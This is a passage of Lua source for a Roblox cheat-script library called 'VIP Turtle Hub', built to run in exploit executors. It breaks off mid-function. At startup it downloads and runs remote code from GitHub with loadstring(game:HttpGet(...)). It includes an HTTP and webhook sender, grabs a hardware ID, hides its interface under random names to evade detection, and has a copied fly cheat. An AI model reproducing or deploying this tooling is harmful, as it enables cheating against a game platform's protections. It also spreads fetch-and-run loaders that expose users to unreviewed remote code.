local lib = {RainbowColorValue = 0,HueSelectionPosition = 0}
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local LocalPlayer = game:GetService("Players").LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Network = game:GetService("NetworkClient")
local PresetColor = Color3.fromRGB(44, 120, 224)
local CloseBind = Enum.KeyCode.RightControl
local http = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local GroupService = game:GetService("GroupService")
local workspace = game:GetService("Workspace")
local GUID = HttpService:GenerateGUID(false)
local LogService = game:GetService("LogService")
local Notif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/keysystemv2api/master/ui/notify_ui.lua"))()
local VirtualUser = game:GetService("VirtualUser")
local workspace = game:GetService("Workspace")
local rd3Exploit = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/VortexExecutor/main/Clone.lua"))()
local TeleportService = game:GetService("TeleportService")
local TextChatService = game:GetService("TextChatService")
local Stats = game:GetService("Stats")
local StarterGui = game:GetService("StarterGui")
local getinfo = getinfo or debug.getinfo
local VirtualInputManager = game:GetService("VirtualInputManager")
local Camera = workspace.CurrentCamera
local Chat = game:GetService("Chat")
local DEBUG = true
local Hooked = {}
local Detected, Kill
local TP_DISTANCE = {under = -20,top = 20,behind = 1.5,tpm = "behind",tps = "Based On Magnitude",TweenSpeed = 0.7,Rotation = 20}
local TP_DISTANCE2 = {under = -20,top = 20,behind = -1.5,tpm = "behind",tps = "Based On Magnitude",TweenSpeed = 0.7,Rotation = 20}
local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
local names = {"K","M","B","T","Qa","Qi","Sx","Sp","Oc","No","Dd","Ud","Dd","Td","Qad","Qid","Sxd","Spd","Ocd","Nod","Vg","Uvg","Dvg","Tvg","Qavg","Qivg","Sxvg","Spvg","Ocvg"}
local pows = {}
local Studs = {"Meters","Kilometers","Megameters","Gigameters","Terameter"}
local pows2 = {}
local MemorySizes = {"MB","GB","TB","PB","EB","ZB","YB"}
local MemoryIndex = 1
local MemoryConvertedValue = 0
local tabChar = "	"
local ContextActionService = game:GetService("ContextActionService")
local AvatarEditorService = game:GetService("AvatarEditorService")
local iyflyspeed = 1
local vehicleflyspeed = 1
local isGuiOpened = true
local FLYING = false
local flyKeyDown = nil
local flyKeyUp = nil
local CameraModule = nil
local controlModule = nil
if LocalPlayer["PlayerScripts"]:FindFirstChild("PlayerModule") then
	if LocalPlayer["PlayerScripts"]["PlayerModule"]:FindFirstChild("CameraModule") then
		CameraModule = LocalPlayer["PlayerScripts"]["PlayerModule"]["CameraModule"]
	end
	if LocalPlayer["PlayerScripts"]["PlayerModule"]:FindFirstChild("ControlModule") then
		controlModule = require(LocalPlayer["PlayerScripts"]["PlayerModule"]["ControlModule"])
	end
end

if getgenv and typeof(mobileflyspeed) == "nil" and typeof(vflyspeed) == "nil" then --global variable for changing fly speed through Turtle-Intelligence
	getgenv().mobileflyspeed = 1
	getgenv().vflyspeed = 1
end

local envs = {
	__SELF = function()
		return LocalPlayer
	end,
	__WORKSPACE = function()
		return workspace
	end,
	__MOUSE = function()
		return Mouse
	end,
	_RUN_SERVICE = function()
		return RunService
	end,
	__HTTP_REQUEST = function(url,methods,authorization,contenttype,...)
		local args = {...}
		if methods:lower() == "post" then
			if authorization ~= "" then
				if contenttype == "application/json" then
					local response = http({
							Url = url,
							Method = methods:upper(),
							Headers = {
								["Content-Type"] = "application/json",
								["Authorization"] = authorization
							},
							Body = HttpService:JSONEncode(args)
					})
				elseif contenttype == "application/x-www-form-urlencoded" then
					local response = http({
							Url = url,
							Method = methods:upper(),
							Headers = {
								["Content-Type"] = "application/x-www-form-urlencoded",
								["Authorization"] = authorization
							},
							Body = args[1]
					})
				end
			else
				if contenttype == "application/json" then
					local response = http({
							Url = url,
							Method = methods:upper(),
							Headers = {
								["Content-Type"] = "application/json",
								--["Authorization"] = authorization
							},
							Body = HttpService:JSONEncode(args)
					})
				elseif contenttype == "application/x-www-form-urlencoded" then
					local response = http({
							Url = url,
							Method = methods:upper(),
							Headers = {
								["Content-Type"] = "application/x-www-form-urlencoded",
								--["Authorization"] = authorization
							},
							Body = args[1]
					})
				end
			end
		elseif methods:lower() == "get" then
			if authorization ~= "" then
				if contenttype == "application/json" then
					local response = http({
							Url = url,
							Method = methods:upper(),
							Headers = {
								["Content-Type"] = "application/json",
								["Authorization"] = authorization
							}
					})
					return HttpService:JSONDecode(response.Body)
				elseif contenttype == "application/x-www-form-urlencoded" then
					local response = http({
							Url = url,
							Method = methods:upper(),
							Headers = {
								["Content-Type"] = "application/x-www-form-urlencoded",
								["Authorization"] = authorization
							}
					})
					return response.Body
				end
			else
				if contenttype == "application/json" then
					local response = http({
							Url = url,
							Method = methods:upper(),
							Headers = {
								["Content-Type"] = "application/json",
								--["Authorization"] = authorization
							}
					})
					return HttpService:JSONDecode(response.Body)
				elseif contenttype == "application/x-www-form-urlencoded" then
					local response = http({
							Url = url,
							Method = methods:upper(),
							Headers = {
								["Content-Type"] = "application/x-www-form-urlencoded",
								--["Authorization"] = authorization
							}
					})
					return response.Body
				end
			end --END
		end
	end,
	__PLAY_MUSIC = function(args)
		--local args = {...}
		if args["Parent"]:FindFirstChild("TurtleMusic") then
			args["Parent"]["TurtleMusic"].SoundId = "rbxassetid://" .. args["Id"]
			args["Parent"]["TurtleMusic"].Volume = args["Volume"]
			args["Parent"]["TurtleMusic"].PlaybackSpeed = args["PlaybackSpeed"]
			args["Parent"]["TurtleMusic"].Looped = args["Looped"]
			args["Parent"]["TurtleMusic"].TimePosition = args["TimePosition"]
			args["Parent"]["TurtleMusic"].Pitch = args["Pitch"]
			args["Parent"]["TurtleMusic"].RollOffMode = (args["RollOffMode"] or Enum.RollOffMode.Linear)
			args["Parent"]["TurtleMusic"].RollOffMaxDistance = args["RollOffMaxDistance"]
			args["Parent"]["TurtleMusic"].RollOffMinDistance = args["RollOffMinDistance"]
			args["Parent"]["TurtleMusic"].EmitterSize = args["EmitterSize"]
			args["Parent"]["TurtleMusic"].DopplerScale = args["DopplerScale"]
			args["Parent"]["TurtleMusic"].SoundGroup = args["SoundGroup"]
			args["Parent"]["TurtleMusic"].EndTime = args["EndTime"]
			args["Parent"]["TurtleMusic"]:Play()
		else
			local sound = Instance.new("Sound")
			sound.Name = "TurtleMusic"
			sound.SoundId = "rbxassetid://" .. args["Id"]
			sound.Volume = args["Volume"]
			sound.PlaybackSpeed = args["PlaybackSpeed"]
			sound.Looped = args["Looped"]
			sound.TimePosition = args["TimePosition"]
			sound.Pitch = args["Pitch"]
			sound.RollOffMode = (args["RollOffMode"] or Enum.RollOffMode.Linear)
			sound.RollOffMaxDistance = args["RollOffMaxDistance"]
			sound.RollOffMinDistance = args["RollOffMinDistance"]
			sound.EmitterSize = args["EmitterSize"]
			sound.DopplerScale = args["DopplerScale"]
			sound.SoundGroup = args["SoundGroup"]
			sound.Parent = args["Parent"]
			sound:Play()
		end
	end,
	__STOP_MUSIC = function(instance)
		if typeof(instance) == "Instance" then
			if instance:IsA("Sound") then
				instance:Stop()
			end
		end
	end,
	__SERVICE = function(name)
		return game:GetService(name)
	end,
	__ENCODE_BASE64 = function(str)
		return HttpService:Base64Encode(str)
	end,
	__DECODE_BASE64 = function(str)
		return HttpService:Base64Decode(str)
	end
}

setmetatable(lib,envs)
local returned_string = { -- returned_string["typeof() function"]
	["type() function"] = {
		"nil",
		"number",
		"string",
		"boolean",
		"table",
		"function",
		"thread",
		"userdata"
	},
	["typeof() function"] = {
		"nil",
		"number",
		"string",
		"boolean",
		"table",
		"function",
		"thread",
		"userdata",
		"Instance",
		"Vector3",
		"CFrame",
		"Color3",
		"UDim2",
		"BrickColor",
		"Ray",
		"TweenInfo",
		"EnumItem",
		"Enum",
		"RBXScriptSignal",
		"RBXScriptConnection",
		"Vector2",
		"Rect",
		"Region3",
		"Region3int16",
		"UDim",
		"PhysicalProperties",
		"ColorSequence",
		"ColorSequenceKeypoint",
		"NumberSequence",
		"NumberSequenceKeypoint",
		"NumberRange",
		"Rect",
		"Tween",
		"Path",
		"Axes",
		"Faces",
		"DockWidgetPluginGuiInfo",
		"CatalogSearchParams",
		"OverlapParams",
		"RaycastParams",
		"RaycastResult",
		"UserSettings"
	}
}

local HTMLcolors = { 
    ["Red"] = "rgb(255, 0, 0)",
    ["Yellow"] = "rgb(255, 255, 0)",
    ["Orange"] = "rgb(255, 165, 0)",
    ["Pink"] = "rgb(255, 192, 203)",
    ["Light Green"] = "rgb(50, 205, 50)",
    ["Sky Blue"] = "rgb(135, 206, 235)",
    ["Black"] = "rgb(0, 0, 0)",
    ["Dark Red"] = "rgb(139, 0, 0)",
    ["Dark Green"] = "rgb(0, 100, 0)",
    ["Dark Blue"] = "rgb(0, 0, 139)",
    ["Gray"] = "rgb(128,128,128)",
    ["G2"] = "rgb(68,68,68)",
    ["Dark Purple"] = "rgb(128, 0, 128)",
    ["Dark Brown"] = "rgb(101, 67, 33)",
    ["Dark Purple"] = "rgb(128, 0, 128)",
    ["Dark Blue"] = "rgb(0, 0, 128)",
    ["Brown"] = "rgb(139, 69, 19)",
    ["Purple"] = "rgb(128, 0, 128)",
    ["Blue"] = "rgb(0, 0, 255)",
    ["White"] = "rgb(255, 255, 255)",
    ["Green"] = "rgb(0, 255, 0)",
    ["Bright Blue"] = "rgb(173, 216, 230)",
    ["Lavender"] = "rgb(230, 230, 250)",
    ["Peach"] = "rgb(255, 218, 185)",
    ["Teal"] = "rgb(0, 128, 128)",
    ["Salmon"] = "rgb(250, 128, 114)",
    ["Gold"] = "rgb(255, 215, 0)",
    ["Dark Slate Gray"] = "rgb(47, 79, 79)",
    ["Slate Blue"] = "rgb(106, 90, 205)",
    ["Cadet Blue"] = "rgb(95, 158, 160)",
    ["Chocolate"] = "rgb(210, 105, 30)",
    ["Forest Green"] = "rgb(34, 139, 34)",
    ["Steel Blue"] = "rgb(70, 130, 180)",
    ["Olive"] = "rgb(128, 128, 0)",
    ["Tomato"] = "rgb(255, 99, 71)",
    ["Khaki"] = "rgb(240, 230, 140)",
    ["Peru"] = "rgb(205, 133, 63)",
    ["Royal Blue"] = "rgb(65, 105, 225)",
    ["Medium Purple"] = "rgb(147, 112, 219)",
    ["Blue Violet"] = "rgb(138, 43, 226)",
    ["Cornflower Blue"] = "rgb(100, 149, 237)",
    ["Indian Red"] = "rgb(205, 92, 92)",
    ["Medium Violet Red"] = "rgb(199, 21, 133)",
    ["Pale Violet Red"] = "rgb(219, 112, 147)",
    ["Medium Sea Green"] = "rgb(60, 179, 113)",
    ["Yellow Green"] = "rgb(154, 205, 50)",
    ["Sky Blue"] = "rgb(135, 206, 235)",
    ["Medium Slate Blue"] = "rgb(123, 104, 238)",
    ["Medium Turquoise"] = "rgb(72, 209, 204)",
    ["Light Sea Green"] = "rgb(32, 178, 170)",
    ["Dark Olive Green"] = "rgb(85, 107, 47)",
    ["Medium Orchid"] = "rgb(186, 85, 211)",
    ["Slate Gray"] = "rgb(112, 128, 144)",
    ["Deep Sky Blue"] = "rgb(0, 191, 255)"
}

local letters = {
        ["A"] = "🅰",
        ["a"] = "🅰",
        ["B"] = "🅱",
        ["b"] = "🅱",
        ["C"] = "🅲",
        ["c"] = "🅲",
        ["D"] = "🅳",
        ["d"] = "🅳",
        ["E"] = "🅴",
        ["e"] = "🅴",
        ["F"] = "🅵",
        ["f"] = "🅵",
        ["G"] = "🅶",
        ["g"] = "🅶",
        ["H"] = "🅷",
        ["h"] = "🅷",
        ["I"] = "🅸",
        ["i"] = "🅸",
        ["J"] = "🅹",
        ["j"] = "🅹",
        ["K"] = "🅺",
        ["k"] = "🅺",
        ["L"] = "🅻",
        ["l"] = "🅻",
        ["M"] = "🅼",
        ["m"] = "🅼",
        ["N"] = "🅽",
        ["n"] = "🅽",
        ["O"] = "🅾",
        ["o"] = "🅾",
        ["P"] = "🅿",
        ["p"] = "🅿",
        ["Q"] = "🆀",
        ["q"] = "🆀",
        ["R"] = "🆁",
        ["r"] = "🆁",
        ["S"] = "🆂",
        ["s"] = "🆂",
        ["T"] = "🆃",
        ["t"] = "🆃",
        ["U"] = "🆄",
        ["u"] = "🆄",
        ["V"] = "🆅",
        ["v"] = "🆅",
        ["W"] = "🆆",
        ["w"] = "🆆",
        ["X"] = "🆇",
        ["x"] = "🆇",
        ["Y"] = "🆈",
        ["y"] = "🆈",
        ["Z"] = "🆉",
        ["z"] = "🆉",
        [" "] = " "
}

local letters2 = {
        ["a"] = "\225\180\128\204\178",
        ["b"] = "\202\153\204\178",
        ["c"] = "\225\180\132\204\178",
        ["d"] = "\225\180\133\204\178",
        ["e"] = "\225\180\135\204\178",
        ["f"] = "\210\147\204\178",
        ["g"] = "\201\162\204\178",
        ["h"] = "\202\156\204\178",
        ["i"] = "\201\170\204\178",
        ["j"] = "\225\180\138\204\178",
        ["k"] = "\225\180\139\204\178",
        ["l"] = "\202\159\204\178",
        ["m"] = "\225\180\141\204\178",
        ["n"] = "\201\180\204\178",
        ["o"] = "\225\180\143\204\178",
        ["p"] = "\225\180\152\204\178",
        ["q"] = "\225\180\143\204\178\204\168",
        ["r"] = "\202\128\204\178",
        ["s"] =  "s\204\178",
        ["t"] = "\225\180\155\204\178",
        ["u"] = "\225\180\156\204\178\204\178",
        ["v"] = "\225\180\160\204\178",
        ["w"] = "\225\180\161\204\178",
        ["x"] = "\209\133\204\178",
        ["y"] = "\202\143\204\178",
        ["z"] = "\225\180\162\204\178", -- end this
        ["A"] = "\225\180\128\204\178",
        ["B"] = "\202\153\204\178",
        ["C"] = "\225\180\132\204\178",
        ["D"] = "\225\180\133\204\178",
        ["E"] = "\225\180\135\204\178",
        ["F"] = "\210\147\204\178",
        ["G"] = "\201\162\204\178",
        ["H"] = "\202\156\204\178",
        ["I"] = "\201\170\204\178",
        ["I"] = "\225\180\138\204\178",
        ["K"] = "\225\180\139\204\178",
        ["L"] = "\202\159\204\178",
        ["M"] = "\225\180\141\204\178",
        ["N"] = "\201\180\204\178",
        ["O"] = "\225\180\143\204\178",
        ["P"] = "\225\180\152\204\178",
        ["Q"] = "\225\180\143\204\178\204\168",
        ["R"] = "\202\128\204\178",
        ["S"] =  "s\204\178",
        ["T"] = "\225\180\155\204\178",
        ["U"] = "\225\180\156\204\178\204\178",
        ["V"] = "\225\180\160\204\178",
        ["W"] = "\225\180\161\204\178",
        ["X"] = "\209\133\204\178",
        ["Y"] = "\202\143\204\178",
        ["Z"] = "\225\180\162\204\178", -- end this
        [" "] = " "
}

--[[if game:GetService("CoreGui"):FindFirstChild("VIP TURTLE HUB UI") then
	game:GetService("CoreGui")["VIP TURTLE HUB UI"]:Destroy()
	ContextActionService:UnbindAction("Turtle Menu")
end]]

function lib.randomString()
	local length = math.random(10,20)
	local array = {}
	for i = 1, length do
		array[i] = string.char(math.random(32,126))
	end
	return table.concat(array)
end

function lib.Interface(str)
	if str == "hide" then
		if typeof(get_hidden_gui) ~= "nil" or typeof(gethui) ~= "nil" then
			local hiddenUI = get_hidden_gui or gethui
			local Main = Instance.new("ScreenGui")
			Main.Name = lib.randomString()
			Main.Parent = hiddenUI()
			--Notif:NotifyUser(`<b>Turtle Hub running in {identifyexecutor()} Environment</b>`,10)
			return Main
		elseif (not is_sirhurt_closure) and (syn and syn.protect_gui) then
			local Main = Instance.new("ScreenGui")
			Main.Name = lib.randomString()
			syn.protect_gui(Main)
			Main.Parent = game:GetService("CoreGui")
			--Notif:NotifyUser("<b>Turtle Hub running in Synapse X Environment</b>",10)
			return Main
		elseif game:GetService("CoreGui"):FindFirstChild('RobloxGui') then
			local Main = Instance.new("ScreenGui")
			Main.Name = lib.randomString()
			Main.Parent = game:GetService("CoreGui")["RobloxGui"]
			--Notif:NotifyUser("<b>Turtle Hub running in Roblox Client</b>",10)
			return Main
		else
			local Main = Instance.new("ScreenGui")
			Main.Name = lib.randomString()
			Main.Parent = game:GetService("CoreGui")
			--Notif:NotifyUser("<b>No environment available</b>",10)
			return Main
		end
	elseif str == "log" or str == "get" then
		if get_hidden_gui then
			return get_hidden_gui()
		elseif gethui then
			return gethui()
		end
	end
end

if lib.Interface("log").Name == "VIP TURTLE HUB UI" then
	lib.Interface("log"):Destroy()
	ContextActionService:UnbindAction("Turtle Menu")
end

local ui = Instance.new("ScreenGui")
ui.Name = "VIP TURTLE HUB UI"
ui.Parent = lib.Interface("hide")
ui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local GO_FUCK_URSELF = Instance.new("ScreenGui")
GO_FUCK_URSELF.Name = "INTERFACE HANDLERS"
GO_FUCK_URSELF.Parent = lib.Interface("hide")
GO_FUCK_URSELF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local ScreenGuisForTH = Instance.new("ScreenGui")
local THNFrame = Instance.new("Frame")
local UIAspectRatioConstraints = Instance.new("UIAspectRatioConstraint")
local UICorners = Instance.new("UICorner")
local UIListLayouts = Instance.new("UIListLayout")
local TextLabels = Instance.new("TextLabel")
local TextButtons = Instance.new("TextButton")
local TextButton_2s = Instance.new("TextButton")
local UICorner_2s = Instance.new("UICorner")
local UICorner_3s = Instance.new("UICorner")

ScreenGuisForTH.Parent = ui
ScreenGuisForTH.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGuisForTH.Enabled = false
ScreenGuisForTH.Name = "Turtle UI Notify"

THNFrame.Parent = ScreenGuisForTH
THNFrame.BackgroundColor3 = Color3.fromRGB(19, 24, 52)
THNFrame.Position = UDim2.new(0.5,0,.5,0)
THNFrame.Size = UDim2.new(.55,0,.6,0)
THNFrame.AnchorPoint = Vector2.new(.5,.5)

UIAspectRatioConstraints.Parent = THNFrame
UIAspectRatioConstraints.AspectRatio = 2.000

UICorners.CornerRadius = UDim.new(0, 15)
UICorners.Parent = THNFrame

UIListLayouts.Parent = THNFrame
UIListLayouts.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayouts.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayouts.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayouts.Padding = UDim.new(.05, 0)

TextLabels.Parent = THNFrame
TextLabels.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabels.BackgroundTransparency = 1.000
TextLabels.Position = UDim2.new(0.5, 0, 0.1, 0)
TextLabels.Size = UDim2.new(1, 0, .5, 0)
TextLabels.Font = Enum.Font.GothamBlack
TextLabels.Text = "Error"
TextLabels.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabels.TextSize = 17.000
TextLabels.TextWrapped = true
TextLabels.RichText = true

TextButtons.Parent = THNFrame
TextButtons.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
TextButtons.Size = UDim2.new(.5, 0, .15, 0)
TextButtons.Font = Enum.Font.SourceSans
TextButtons.Text = "(...)" -- Yes
TextButtons.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButtons.TextSize = 41.000
TextButtons.TextWrapped = true
TextButtons.RichText = true
            
TextButton_2s.Parent = THNFrame
TextButton_2s.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextButton_2s.Size = UDim2.new(.5,0,.15,0)
TextButton_2s.Font = Enum.Font.SourceSans
TextButton_2s.Text = "(...)" -- No
TextButton_2s.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2s.TextSize = 41.000
TextButton_2s.TextWrapped = true
TextButton_2s.RichText = true
TextButton_2s.Visible = false

UICorner_2s.CornerRadius = UDim.new(.1, 0)
UICorner_2s.Parent = TextButtons
UICorner_3s.CornerRadius = UDim.new(.1, 0)
UICorner_3s.Parent = TextButton_2s
local cc = true

local function CloseWarnInterface()
	THNFrame:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true,function()
			ScreenGuisForTH.Enabled = false
	end)
end

TextButtons.MouseButton1Click:Connect(function()
		if cc == true then
			CloseWarnInterface()
		end
end)

TextButton_2s.MouseButton1Click:Connect(function()
		CloseWarnInterface()
end)

--local falseclick = 10
--local autoclose = false

local function HWID()
	return string.gsub(game:GetService("RbxAnalyticsService"):GetClientId(), "-", "")
end

function lib:WarnUser(title) --,params)
  --[[if ScreenGuisForTH.Enabled == true then
	CloseWarnInterface()
  else
	THNFrame:TweenSize(UDim2.new(.55,0,.6,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true)
  end]]
  TextLabels.Text = title:gsub("${user.hwid}",HWID())
  TextButtons.Text = "OK"
  ScreenGuisForTH.Enabled = true
  --autoclose = params["AutoClose"]
  --[[if autoclose == true then
	cc = params["CanClick"]
	TextButtons.BackgroundTransparency = 0.7
	TextButtons.TextTransparency = 0.5
	task.spawn(function()
	--for array = 1,params["Duration"] do
	while falseclick > 0 do
		if cc == false then
			TextButtons.Text = "Auto Close in " .. falseclick .. "s" --array .. "s"
			wait(1)
			falseclick = falseclick + -1
		end
	end
	CloseWarnInterface()
	end)
  end]]
end --lib:WarnUser("",{AutoClose = true,CanClick = false,Duration = 9e9})

--[[coroutine.wrap(
    function()
        while wait() do
            lib.RainbowColorValue = lib.RainbowColorValue + 1 / 255
            lib.HueSelectionPosition = lib.HueSelectionPosition + 1

            if lib.RainbowColorValue >= 1 then
                lib.RainbowColorValue = 0
            end

            if lib.HueSelectionPosition == 80 then
                lib.HueSelectionPosition = 0
            end
        end
    end
)()
Studs
]]

for i = 1,#names do 
  table.insert(pows,1000 ^ i)
end

for i = 1,#Studs do 
  table.insert(pows2,1000 ^ i)
end

function lib:MemoryFormat(bytes)
    return string.format("%.2f %s",bytes / math.pow(1024,math.floor(math.log(bytes) / math.log(1024))),MemorySizes[math.floor(math.log(bytes) / math.log(1024)) + 1]) --MemoryConvertedValue,MemorySizes[MemoryIndex + 1])
end

-- Contoh penggunaan: lib:MemoryFormat(

function lib:CurrencyFormat(x: number): string 
	if math.abs(x) < 1000 then
		return math.floor(x)
	end
	
	return math.floor(math.abs(x) / pows[math.min(math.floor(math.log10(math.abs(x)) / 3),#names)] * 100) / 100 * math.sign(x) .. names[math.min(math.floor(math.log10(math.abs(x)) / 3),#names)]
end

function lib:DistanceFormat(x: number): string 
	if math.abs(x) < 1000 then
		return math.floor(x)
	end
	
	return math.floor(math.abs(x) / pows2[math.min(math.floor(math.log10(math.abs(x)) / 3),#Studs)] * 100) / 100 * math.sign(x) .. Studs[math.min(math.floor(math.log10(math.abs(x)) / 3),#Studs)]
end

local function MakeDraggable(topbarobject,object)
    local Dragging = nil
    local DragInput = nil
    local DragStart = nil
    local StartPosition = nil

    local function Update(input)
        local Delta = input.Position - DragStart
        local pos =
            UDim2.new(
            StartPosition.X.Scale,
            StartPosition.X.Offset + Delta.X,
            StartPosition.Y.Scale,
            StartPosition.Y.Offset + Delta.Y
        )
        object.Position = pos
    end

    topbarobject.InputBegan:Connect(
        function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                Dragging = true
                DragStart = input.Position
                StartPosition = object.Position

                input.Changed:Connect(
                    function()
                        if input.UserInputState == Enum.UserInputState.End then
                            Dragging = false
                        end
                    end
                )
            end
        end
    )

    topbarobject.InputChanged:Connect(
        function(input)
            if
                input.UserInputType == Enum.UserInputType.MouseMovement or
                    input.UserInputType == Enum.UserInputType.Touch
             then
                DragInput = input
            end
        end
    )

    UserInputService.InputChanged:Connect(
        function(input)
            if input == DragInput and Dragging then
                Update(input)
            end
        end
    )
end

function lib:children(path,f,t)
	local index = t or false
	if typeof(path) == "Instance" then
		for i,v in pairs(path:GetChildren()) do 
			if index == true then
				f(i,v)
			else
				f(v)
			end
		end
	elseif typeof(path) == "table" then
		for i,v in pairs(path) do 
			if index == true then
				f(i,v)
			else
				f(v)
			end
		end
	end
end

function lib:descendant(path,f,t)
	local index = t or false
	for i,v in pairs(path:GetDescendants()) do
		if index == true then
			f(i,v)
		else
			f(v)
		end
	end
end

function lib.scanner(v,path)
	local instance = path or workspace
	if v == true then
		lib:descendant(instance,function(i) 
			if i:IsA("BasePart") or i:IsA("Part") and not i.Parent:FindFirstChildOfClass('Humanoid') and not i.Parent.Parent:FindFirstChildOfClass('Humanoid') then
				i.LocalTransparencyModifier = 1
			end
		end)
	else
		lib:descendant(instance,function(i) 
			if i:IsA("BasePart") or i:IsA("Part") and not i.Parent:FindFirstChildOfClass('Humanoid') and not i.Parent.Parent:FindFirstChildOfClass('Humanoid') then
				i.LocalTransparencyModifier = 0
			end
		end)
	end
end

function lib:GetPlayer(f)
	for i,v in pairs(game.Players:GetPlayers()) do
		if v.UserId ~= LocalPlayer.UserId then
			if v.UserId ~= 3621188307 then
				f(v)
			end
		end
	end
end

function lib.PlayAnim(id,time,speed,ismp)
	pcall(function()
		if LocalPlayer.Character.Humanoid:FindFirstChild("SUP SKID") then
			LocalPlayer.Character.Humanoid["SUP SKID"]:Destroy()
		end
		LocalPlayer.Character.Animate.Disabled = false
		for i,track in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
			track:Stop()
		end
		LocalPlayer.Character.Animate.Disabled = true
		local Anim = Instance.new("Animation")
		Anim.Parent = LocalPlayer.Character.Humanoid
		Anim.Name = "SUP SKID"
		if ismp == false then
			Anim.AnimationId = "rbxassetid://" .. id
		else
			Anim.AnimationId = id
		end
		local loadanim = LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		loadanim:Play()
		loadanim.TimePosition = time
		loadanim:AdjustSpeed(speed)
		loadanim.Stopped:Connect(function()
			LocalPlayer.Character.Animate.Disabled = false
			loadanim:Stop()
			for i,track in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
				track:Stop()
			end
		end)
	end)
end

function lib.StopAnim()
	LocalPlayer.Character.Animate.Disabled = false
	if LocalPlayer.Character.Humanoid:FindFirstChild("SUP SKID") then
		LocalPlayer.Character.Humanoid["SUP SKID"]:Destroy()
	end
	for i,track in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do 
		track:Stop()
	end
end

function lib.WebhookSenderV2(url,usn,msg)
	http({
		Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = msg,username = usn})
        })
end

function lib.response(a,b,tbl)
	if type(tbl) == "table" then
		if writefile then
			if isfolder(a) then
				writefile(a .. "/byteDecoder-" .. b,HttpService:JSONEncode(tbl))
			else
				makefolder(a)
				writefile(a .. "/byteDecoder-" .. b,HttpService:JSONEncode(tbl))
			end
		end
	elseif type(tbl) == "function" then
		if isfile(a .. "/byteDecoder-" .. b) then
			tbl(HttpService:JSONDecode(readfile(a .. "/byteDecoder-" .. b)))
		end
	end
end

local velocityHandlerName = lib.randomString()
local gyroHandlerName = lib.randomString()
local mfly1 = nil
local mfly2 = nil
--local FLYING = false

function lib.getHierarchy(obj)
	local fullname
	local period

	if string.find(obj.Name,' ') then
		fullname = '["'..obj.Name..'"]'
		period = false
	else
		fullname = obj.Name
		period = true
	end

	local getS = obj
	local parent = obj
	local service = ''

	if getS.Parent ~= game then
		repeat
			getS = getS.Parent
			service = getS.ClassName
		until getS.Parent == game
	end

	if parent.Parent ~= getS then
		repeat
			parent = parent.Parent
			if string.find(tostring(parent),' ') then
				if period then
					fullname = '["'..parent.Name..'"].'..fullname
				else
					fullname = '["'..parent.Name..'"]'..fullname
				end
				period = false
			else
				if period then
					fullname = parent.Name..'.'..fullname
				else
					fullname = parent.Name..''..fullname
				end
				period = true
			end
		until parent.Parent == getS
	elseif string.find(tostring(parent),' ') then
		fullname = '["'..parent.Name..'"]'
		period = false
	end

	if period then
		return 'game:GetService("'..service..'").'..fullname
	else
		return 'game:GetService("'..service..'")'..fullname
	end
end

function lib:unmobilefly()
	pcall(function()
		FLYING = false
		LocalPlayer.Character.HumanoidRootPart:FindFirstChild(gyroHandlerName):Destroy()
		LocalPlayer.Character.HumanoidRootPart:FindFirstChild(velocityHandlerName):Destroy()
		LocalPlayer.Character.Humanoid.PlatformStand = false
		mfly1:Disconnect()
		mfly2:Disconnect()
	end)
end

function lib:mobilefly(vfly) -- skidded from infinite yield, thx Akbar for skid :) lib:mobilefly(false) lib:unmobilefly()
	lib:unmobilefly()
	FLYING = true

	--local camera = workspace.CurrentCamera
	local v3none = Vector3.new()
	local v3zero = Vector3.new(0,0,0)
	local v3inf = Vector3.new(9e9,9e9,9e9)

	local bv = Instance.new("BodyVelocity")
	bv.Name = velocityHandlerName
	bv.Parent = LocalPlayer.Character.HumanoidRootPart
	bv.MaxForce = Vector3.new(0,0,0)
	bv.Velocity = Vector3.new(0,0,0)

	local bg = Instance.new("BodyGyro")
	bg.Name = gyroHandlerName
	bg.Parent = LocalPlayer.Character.HumanoidRootPart
	bg.MaxTorque = Vector3.new(9e9,9e9,9e9)
	bg.P = 1000
	bg.D = 50

	mfly1 = LocalPlayer.CharacterAdded:Connect(function()
		--local bv = Instance.new("BodyVelocity")
		--bv.Name = velocityHandlerName
		bv.Parent = LocalPlayer.Character.HumanoidRootPart
		--bv.MaxForce = Vector3.new(0,0,0)
		--bv.Velocity = Vector3.new(0,0,0)

		--local bg = Instance.new("BodyGyro")
		--bg.Name = gyroHandlerName
		bg.Parent = LocalPlayer.Character.HumanoidRootPart
		--bg.MaxTorque = Vector3.new(9e9,9e9,9e9)
		--bg.P = 1000
		--bg.D = 50
	end)

	mfly2 = RunService.RenderStepped:Connect(function()
